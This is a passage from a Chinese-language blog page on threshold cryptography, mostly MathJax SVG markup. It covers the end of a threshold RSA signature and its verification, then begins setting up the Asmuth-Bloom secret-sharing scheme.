357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path></g><g data-mml-node="mo" transform="translate(2285, 0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msup" transform="translate(2729.7, 0)"><g data-mml-node="mi"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path></g><g data-mml-node="mo" transform="translate(466, 363) scale(0.707)"><path data-c="2032" d="M79 43Q73 43 52 49T30 61Q30 68 85 293T146 528Q161 560 198 560Q218 560 240 545T262 501Q262 496 260 486Q259 479 173 263T84 45T79 43Z"></path></g></g><g data-mml-node="mo" transform="translate(3440.1, 0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(4106.9, 0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mn" transform="translate(5162.7, 0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g></g></svg></mjx-container>，即<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.186ex" xmlns="http://www.w3.org/2000/svg" width="11.743ex" height="1.903ex" role="img" focusable="false" viewBox="0 -759 5190.5 841"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g><g data-mml-node="mi" transform="translate(529, 0)"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path></g><g data-mml-node="mo" transform="translate(1217.2, 0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mi" transform="translate(2217.4, 0)"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z"></path></g><g data-mml-node="msup" transform="translate(2646.4, 0)"><g data-mml-node="mi"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path></g><g data-mml-node="mo" transform="translate(466, 363) scale(0.707)"><path data-c="2032" d="M79 43Q73 43 52 49T30 61Q30 68 85 293T146 528Q161 560 198 560Q218 560 240 545T262 501Q262 496 260 486Q259 479 173 263T84 45T79 43Z"></path></g></g><g data-mml-node="mo" transform="translate(3634.7, 0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mn" transform="translate(4690.5, 0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g></g></svg></mjx-container>，最终签名：</p>
<script type="math/tex; mode=display">s=y^bx^a\bmod N</script><h2 id="验证签名-1"><a href="#验证签名-1" class="headerlink" title="验证签名"></a>验证签名</h2><p>验证门限签名<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex" xmlns="http://www.w3.org/2000/svg" width="6.205ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 2742.7 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(389, 0)"><path data-c="1D440" d="M289 629Q289 635 232 637Q208 637 201 638T194 648Q194 649 196 659Q197 662 198 666T199 671T201 676T203 679T207 681T212 683T220 683T232 684Q238 684 262 684T307 683Q386 683 398 683T414 678Q415 674 451 396L487 117L510 154Q534 190 574 254T662 394Q837 673 839 675Q840 676 842 678T846 681L852 683H948Q965 683 988 683T1017 684Q1051 684 1051 673Q1051 668 1048 656T1045 643Q1041 637 1008 637Q968 636 957 634T939 623Q936 618 867 340T797 59Q797 55 798 54T805 50T822 48T855 46H886Q892 37 892 35Q892 19 885 5Q880 0 869 0Q864 0 828 1T736 2Q675 2 644 2T609 1Q592 1 592 11Q592 13 594 25Q598 41 602 43T625 46Q652 46 685 49Q699 52 704 61Q706 65 742 207T813 490T848 631L654 322Q458 10 453 5Q451 4 449 3Q444 0 433 0Q418 0 415 7Q413 11 374 317L335 624L267 354Q200 88 200 79Q206 46 272 46H282Q288 41 289 37T286 19Q282 3 278 1Q274 0 267 0Q265 0 255 0T221 1T157 2Q127 2 95 1T58 0Q43 0 39 2T35 11Q35 13 38 25T43 40Q45 46 65 46Q135 46 154 86Q158 92 223 354T289 629Z"></path></g><g data-mml-node="mo" transform="translate(1440, 0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mi" transform="translate(1884.7, 0)"><path data-c="1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path></g><g data-mml-node="mo" transform="translate(2353.7, 0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container>时，验证以下等式是否正确：</p>
<script type="math/tex; mode=display">s^e=H(M)\bmod N</script><h1 id="Asmuth-Bloom-法"><a href="#Asmuth-Bloom-法" class="headerlink" title="Asmuth-Bloom 法"></a>Asmuth-Bloom 法</h1><h2 id="初始化-3"><a href="#初始化-3" class="headerlink" title="初始化"></a>初始化</h2><p>假设<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.05ex" xmlns="http://www.w3.org/2000/svg" width="1.459ex" height="1.645ex" role="img" focusable="false" viewBox="0 -705 645 727"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D446" d="M308 24Q367 24 416 76T466 197Q466 260 414 284Q308 311 278 321T236 341Q176 383 176 462Q176 523 208 573T273 648Q302 673 343 688T407 704H418H425Q521 704 564 640Q565 640 577 653T603 682T623 704Q624 704 627 704T632 705Q645 705 645 698T617 577T585 459T569 456Q549 456 549 465Q549 471 550 475Q550 478 551 494T553 520Q553 554 544 579T526 616T501 641Q465 662 419 662Q362 662 313 616T263 510Q263 480 278 458T319 427Q323 425 389 408T456 390Q490 379 522 342T554 242Q554 216 546 186Q541 164 528 137T492 78T426 18T332 -20Q320 -22 298 -22Q199 -22 144 33L134 44L106 13Q83 -14 78 -18T65 -22Q52 -22 52 -14Q52 -11 110 221Q112 227 130 227H143Q149 221 149 216Q149 214 148 207T144 186T142 153Q144 114 160 87T203 47T255 29T308 24Z"></path></g></g></g></svg></mjx-container>为共享秘密，<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.05ex" xmlns="http://www.w3.org/2000/svg" width="5.29ex" height="1.67ex" role="img" focusable="false" viewBox="0 -716 2338 738"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D437" d="M287 628Q287 635 230 637Q207 637 200 638T193 647Q193 655 197 667T204 682Q206 683 403 683Q570 682 590 682T630 676Q702 659 752 597T803 431Q803 275 696 151T444 3L430 1L236 0H125H72Q48 0 41 2T33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM703 469Q703 507 692 537T666 584T629 613T590 629T555 636Q553 636 541 636T512 636T479 637H436Q392 637 386 627Q384 623 313 339T242 52Q242 48 253 48T330 47Q335 47 349 47T373 46Q499 46 581 128Q617 164 640 212T683 339T703 469Z"></path></g><g data-mml-node="mi" transform="translate(828, 0)"><path data-c="1D436" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q484 659 454 652T382 628T299 572T226 479Q194 422 175 346T156 222Q156 108 232 58Q280 24 350 24Q441 24 512 92T606 240Q610 253 612 255T628 257Q648 257 648 248Q648 243 647 239Q618 132 523 55T319 -22Q206 -22 128 53T50 252Z"></path></g><g data-mml-node="mi" transform="translate(1588, 0)"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path></g></g></g></svg></mjx-container>为秘密分发者，有<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex" xmlns="http://www.w3.org/2000/svg" width="1.357ex" height="1.025ex" role="img" focusable="false" viewBox="0 -442 600 453"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g></g></g></svg></mjx-container>个成员<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.439ex" xmlns="http://www.w3.org/2000/svg" width="13.303ex" height="1.984ex" role="img" focusable="false" viewBox="0 -683 5880 877"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"></path></g><g data-mml-node="mn" transform="translate(642, -150) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g><g data-mml-node="mo" transform="translate(1045.6, 0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msub" transform="translate(1490.2, 0)"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"></path></g><g data-mml-node="mn" transform="translate(642, -150) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(2535.8, 0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mo" transform="translate(2980.4, 0)"><path data-c="22EF" d="M78 250Q78 274 95 292T138 310Q162 310 180 294T199 251Q199 226 182 208T139 190T96 207T78 250ZM525 250Q525 274 542 292T585 310Q609 310 627 294T646 251Q646 226 629 208T586 190T543 207T525 250ZM972 250Q972 274 989 292T1032 310Q1056 310 1074 294T1093 251Q1093 226 1076 208T1033 190T990 207T972 250Z"></path></g><g data-mml-node="mo" transform="translate(4319.1, 0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msub" transform="translate(4763.8, 0)"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"></path></g><g data-mml-node="mi" transform="translate(642, -150) scale(0.707)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g></g></g></g></svg></mjx-container>，<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex" xmlns="http://www.w3.org/2000/svg" width="0.817ex" height="1.441ex" role="img" focusable="false" viewBox="0 -626 361 637"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D461" d="M26 385Q19 392 19 395Q19 399 22 411T27 425Q29 430 36 430T87 431H140L159 511Q162 522 166 540T173 566T179 586T187 603T197 615T211 624T229 626Q247 625 254 615T261 596Q261 589 252 549T232 470L222 433Q222 431 272 431H323Q330 424 330 420Q330 398 317 385H210L174 240Q135 80 135 68Q135 26 162 26Q197 26 230 60T283 144Q285 150 288 151T303 153H307Q322 153 322 145Q322 142 319 133Q314 117 301 95T267 48T216 6T155 -11Q125 -11 98 4T59 56Q57 64 57 83V101L92 241Q127 382 128 383Q128 385 77 385H26Z"></path></g></g></g></svg></mjx-container>为恢复秘密的门限值。<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.05ex" xmlns="http://www.w3.org/2000/svg" width="3.593ex" height="1.645ex" role="img" focusable="false" viewBox="0 -705 1588 727"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D437" d="M287 628Q287 635 230 637Q207 637 200 638T193 647Q193 655 197 667T204 682Q206 683 403 683Q570 682 590 682T630 676Q702 659 752 597T803 431Q803 275 696 151T444 3L430 1L236 0H125H72Q48 0 41 2T33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM703 469Q703 507 692 537T666 584T629 613T590 629T555 636Q553 636 541 636T512 636T479 637H436Q392 637 386 627Q384 623 313 339T242 52Q242 48 253 48T330 47Q335 47 349 47T373 46Q499 46 581 128Q617 164 640 212T683 339T703 469Z"></path></g><g data-mml-node="mi" transform="translate(828, 0)"><path data-c="1D436" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q484 659 454 652T382 628T299 572T226 479Q194 422 175 346T156 222Q156 108 232 58Q280 24 350 24Q441 24 512 92T606 240Q610 253 612 255T628 257Q648 257 648 248Q648 243 647 239Q618 132 523 55T319 -22Q206 -22 128 53T50 252Z"></path></g></g></g></svg></mjx-container>选择大素数<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.439ex" xmlns="http://www.w3.org/2000/svg" width="1.041ex" height="1.439ex" role="img" focusable="false" viewBox="0 -442 460 636"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D45E" d="M33 157Q33 258 109 349T280 441Q340 441 372 389Q373 390 377 395T388 406T404 418Q438 442 450 442Q454 442 457 439T460 434Q460 425 391 149Q320 -135 320 -139Q320 -147 365 -148H390Q396 -156 396 -157T393 -175Q389 -188 383 -194H370Q339 -192 262 -192Q234 -192 211 -192T174 -192T157 -193Q143 -193 143 -185Q143 -182 145 -170Q149 -154 152 -151T172 -148Q220 -148 230 -141Q238 -136 258 -53T279 32Q279 33 272 29Q224 -10 172 -10Q117 -10 75 30T33 157ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g></g></g></svg></mjx-container>和严格递增的序列<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex" xmlns="http://www.w3.org/2000/svg" width="18.931ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 8367.6 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g><g data-mml-node="mo" transform="translate(797.8, 0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mo" transform="translate(1853.6, 0)"><path data-c="7B" d="M434 -231Q434 -244 428 -250H410Q281 -250 230 -184Q225 -177 222 -172T217 -161T213 -148T211 -133T210 -111T209 -84T209 -47T209 0Q209 21 209 53Q208 142 204 153Q203 154 203 155Q189 191 153 211T82 231Q71 231 68 234T65 250T68 266T82 269Q116 269 152 289T203 345Q208 356 208 377T209 529V579Q209 634 215 656T244 698Q270 724 324 740Q361 748 377 749Q379 749 390 749T408 750H428Q434 744 434 732Q434 719 431 716Q429 713 415 713Q362 710 332 689T296 647Q291 634 291 499V417Q291 370 288 353T271 314Q240 271 184 255L170 250L184 245Q202 239 220 230T262 196T290 137Q291 131 291 1Q291 -134 296 -147Q306 -174 339 -192T415 -213Q429 -213 431 -216Q434 -219 434 -231Z"></path></g><g data-mml-node="msub" transform="translate(2353.6, 0)"><g data-mml-node="mi"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g><g data-mml-node="mn" transform="translate(520, -150) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g><g data-mml-node="mo" transform="translate(3277.1, 0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msub" transform="translate(3721.8, 0)"><g data-mml-node="mi"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g><g data-mml-node="mn" transform="translate(520, -150) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 